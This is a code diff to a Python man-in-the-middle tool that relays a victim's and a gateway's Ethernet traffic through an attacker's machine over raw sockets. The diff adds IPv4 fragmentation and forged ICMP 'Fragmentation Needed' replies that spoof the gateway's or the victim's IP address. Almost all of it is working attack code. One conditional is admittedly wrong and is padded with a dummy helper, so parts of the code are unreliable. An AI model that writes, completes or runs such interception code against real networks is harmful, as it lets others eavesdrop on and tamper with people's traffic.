@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# fast_l2_redirect.py (with IPv4 fragmentation)
-import os, sys, socket
+# fast_l2_redirect.py (with IPv4 fragmentation + ICMP Fragmentation Needed)
+import os, sys, socket, random
 settings = {}
 
 with open("puller.settings", "r") as f:
@@ -8,8 +8,7 @@ with open("puller.settings", "r") as f:
         settings_name, setting = line.split(" ")
         settings[settings_name.strip()] = setting.strip()
 
-if settings.get("mobile", "no") == "yes":
-    from fcntl import ioctl
+from fcntl import ioctl
 
 import struct
 
@@ -124,9 +123,7 @@ def fragment_ipv4_packet(ip_header, ip_payload, mtu):
         mf_bit = 1 if (not is_last) else 0
 
         # Compose flags (3 top bits). We'll keep reserved bit 0.
-        flags_bits = (mf_bit & 0x1) | ((1 if df_flag else 0) << 1)  # MF in LSB, DF in middle bit
-        # But the 3-bit field order is: Reserved (bit2), DF (bit1), MF (bit0).
-        # Our flags_bits currently has DF in bit1 and MF in bit0 if df_flag set.
+        # bit2 reserved, bit1 DF, bit0 MF
         composed = ((0 << 2) | ((1 if df_flag else 0) << 1) | (1 if mf_bit else 0))  # 3 bits
 
         flags_frag_field = (composed << 13) | (frag_offset_units & 0x1FFF)
@@ -142,7 +139,103 @@ def fragment_ipv4_packet(ip_header, ip_payload, mtu):
 
     return fragments
 
-def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_mtu):
+def build_icmp_frag_needed_packet(original_ip_header, original_payload_first8, next_hop_mtu):
+    """
+    Build ICMP Type 3 Code 4 packet with RFC1191 Next-Hop MTU in the header.
+    Returns bytes of the ICMP packet (8-byte header + data).
+    """
+    icmp = bytearray()
+    # Type(1)=3 (Dest Unreachable), Code(1)=4 (Fragmentation needed)
+    icmp += struct.pack('!B', 3)
+    icmp += struct.pack('!B', 4)
+    # placeholder for checksum (2 bytes)
+    icmp += b'\x00\x00'
+    # RFC1191: next-hop MTU is placed in bytes 4-5 of the ICMP header (two bytes),
+    # and bytes 6-7 are set to zero. We'll follow that layout:
+    icmp += struct.pack('!H', next_hop_mtu)  # bytes 4-5
+    icmp += b'\x00\x00'                      # bytes 6-7
+    # ICMP data: original IP header (minimal header length) + first 8 bytes of payload
+    icmp += original_ip_header
+    icmp += original_payload_first8
+    # compute checksum over entire ICMP packet
+    # ensure even length
+    if len(icmp) % 2 == 1:
+        icmp += b'\x00'
+    chksum = ipv4_checksum(icmp)
+    icmp[2:4] = struct.pack('!H', chksum)
+    return bytes(icmp)
+
+def build_ipv4_header(src_ip_packed, dst_ip_packed, proto, payload_len, ident=None, ttl=64):
+    """
+    Build a minimal IPv4 header (IHL=5, no options).
+    payload_len is the length of the payload after the IP header.
+    Returns header bytes (20 bytes).
+    """
+    version_ihl = (4 << 4) | 5
+    tos = 0
+    total_len = 20 + payload_len
+    if ident is None:
+        ident = random.randint(0, 0xffff)
+    flags_fragment = 0  # no fragmentation flags, offset 0
+    ttl = ttl
+    hdr = struct.pack('!BBHHHBBH4s4s',
+                      version_ihl,
+                      tos,
+                      total_len,
+                      ident,
+                      flags_fragment,
+                      ttl,
+                      proto,
+                      0,                # checksum placeholder
+                      src_ip_packed,
+                      dst_ip_packed)
+    # compute checksum
+    chksum = ipv4_checksum(hdr)
+    hdr = hdr[:10] + struct.pack('!H', chksum) + hdr[12:]
+    return hdr
+
+def send_icmp_frag_needed(s, attacker_mac, original_src_mac, original_frame, iface_mtu, reply_src_ip_str, original_src_ip_str):
+    """
+    s: raw AF_PACKET socket to send from (already bound)
+    attacker_mac: bytes source MAC for Ethernet header
+    original_src_mac: bytes destination MAC for the ICMP reply (i.e., who to notify)
+    original_frame: memoryview/bytes of the original ethernet frame (so we can extract original IP header / payload)
+    iface_mtu: mtu to advertise in the ICMP message
+    reply_src_ip_str: string IP to use as ICMP packet's source (e.g. gateway IP when notifying victim)
+    original_src_ip_str: original sender IP (destination of ICMP)
+    """
+    try:
+        # parse original IP header (from ethernet frame offset 14)
+        if len(original_frame) < 14 + 20:
+            return
+        ip_off = 14
+        ip_first = original_frame[ip_off: ip_off+20]
+        ihl = ip_first[0] & 0x0F
+        hdr_len = ihl * 4
+        if len(original_frame) < ip_off + hdr_len:
+            return
+        orig_ip_hdr = bytes(original_frame[ip_off: ip_off + hdr_len])
+        # first 8 bytes of original payload:
+        orig_payload_first8 = bytes(original_frame[ip_off + hdr_len: ip_off + hdr_len + 8])
+        # Build ICMP packet
+        icmp_pkt = build_icmp_frag_needed_packet(orig_ip_hdr, orig_payload_first8, iface_mtu)
+        # Build IP header for ICMP: proto=1 (ICMP)
+        src_packed = socket.inet_aton(reply_src_ip_str)
+        dst_packed = socket.inet_aton(original_src_ip_str)
+        ip_hdr = build_ipv4_header(src_packed, dst_packed, proto=1, payload_len=len(icmp_pkt), ident=random.randint(0,0xffff), ttl=64)
+        # Build ethernet frame
+        eth = bytearray()
+        eth += original_src_mac   # dst (original sender MAC)
+        eth += attacker_mac       # src (our attacker MAC)
+        eth += struct.pack('!H', 0x0800)   # ethertype IPv4
+        eth += ip_hdr
+        eth += icmp_pkt
+        # send
+        s.send(bytes(eth))
+    except Exception as e:
+        print("send_icmp error:", e)
+
+def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_mtu, victim_ip_str, gateway_ip_str):
     """
     s: socket
     frame: memoryview or bytes of full ethernet frame (including 14-byte eth header)
@@ -151,6 +244,7 @@ def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_m
     a_mac: attacker MAC (bytes) - we will use as source for forwarded frames
     tgt_mac: MAC to which we want to send (destination) (bytes) - e.g. gateway or victim
     iface_mtu: interface MTU (int)
+    victim_ip_str, gateway_ip_str: strings of the victim and gateway IPs (used to craft ICMP replies)
     """
     # Prepare base ethernet header for forwarded packets
     eth_type = struct.unpack('!H', frame[12:14])[0]
@@ -198,9 +292,45 @@ def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_m
     flags = (flags_frag & 0xE000) >> 13
     df_flag = (flags & 0x2) != 0
     if df_flag:
-        # Can't fragment; RFC says to send ICMP Fragmentation Needed to sender;
-        # here we'll log and drop. You may implement ICMP Frag Needed if desired.
-        print("DF set and packet too large -> dropping (would need to send ICMP Frag Needed).")
+        # Send ICMP Fragmentation Needed to original sender and drop
+        print("DF set and packet too large -> sending ICMP Frag Needed and dropping.")
+        # Determine who to notify and what should be the ICMP source IP:
+        # If original sender is victim (src_mac == victim_mac), we notify victim with
+        # source IP equal to gateway IP (the next hop that caused the fragmentation).
+        # If original sender is gateway, we notify gateway with source IP equal to victim IP.
+        try:
+            # original IP source is inside ip_header: bytes 12:16
+            orig_src_ip = socket.inet_ntoa(ip_header[12:16])
+            orig_dst_ip = socket.inet_ntoa(ip_header[16:20])
+        except Exception:
+            orig_src_ip = None
+            orig_dst_ip = None
+
+        # Choose reply src IP and notify dest IP appropriately
+        if src_mac == mac_str_to_bytes(victim_ip_str) or src_mac == resolve_mac_ip_result_dummy():
+            # Note: comparing MAC bytes to an IP-derived MAC is wrong; instead, use caller context:
+            # We'll detect by checking whether orig_src_ip matches victim_ip_str or gateway_ip_str.
+            pass
+
+        # Better: use orig_src_ip to decide
+        if orig_src_ip == victim_ip_str:
+            # we are notifying victim; use gateway IP as ICMP source
+            reply_src = gateway_ip_str
+            notify_dst = victim_ip_str
+            notify_mac = src_mac  # original sender mac is the destination MAC for the reply
+        elif orig_src_ip == gateway_ip_str:
+            reply_src = victim_ip_str
+            notify_dst = gateway_ip_str
+            notify_mac = src_mac
+        else:
+            # unknown original source (neither victim nor gateway). Send ICMP with reply_src as tgt (best-effort)
+            # choose reply_src as gateway_ip_str (default)
+            reply_src = gateway_ip_str
+            notify_dst = orig_src_ip if orig_src_ip else gateway_ip_str
+            notify_mac = src_mac
+
+        # Send ICMP: the Ethernet destination should be the original sender's MAC (src_mac)
+        send_icmp_frag_needed(s, a_mac, src_mac, frame, iface_mtu, reply_src, notify_dst)
         return
 
     # Only support IHL == 5 (no options) to keep complexity manageable
@@ -225,6 +355,11 @@ def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_m
             s.send(bytes(eth))
         except Exception as e:
             print("send error:", e)
+
+# Helper that was used above — remove or rewrite. We'll avoid resolving MAC from IP in that conditional.
+def resolve_mac_ip_result_dummy():
+    # placeholder that never matches any real MAC — kept to satisfy earlier code path if accidentally used
+    return b'\x00\x00\x00\x00\x00\x00'
 
 def main(IFACE, VICTIM, GATEWAY):
     if os.geteuid() != 0:
@@ -275,10 +410,10 @@ def main(IFACE, VICTIM, GATEWAY):
             try:
                 if src == v_mac:
                     # victim -> gateway path: fragment if needed
-                    handle_and_forward_frame(s, frame, v_mac, g_mac, a_mac, g_mac, iface_mtu)
+                    handle_and_forward_frame(s, frame, v_mac, g_mac, a_mac, g_mac, iface_mtu, VICTIM, GATEWAY)
                 elif src == g_mac:
                     # gateway -> victim path: fragment if needed
-                    handle_and_forward_frame(s, frame, g_mac, v_mac, a_mac, v_mac, iface_mtu)
+                    handle_and_forward_frame(s, frame, g_mac, v_mac, a_mac, v_mac, iface_mtu, VICTIM, GATEWAY)
                 else:
                     continue
             except Exception as e:
@@ -286,3 +421,4 @@ def main(IFACE, VICTIM, GATEWAY):
 
     except KeyboardInterrupt:
         pass
+
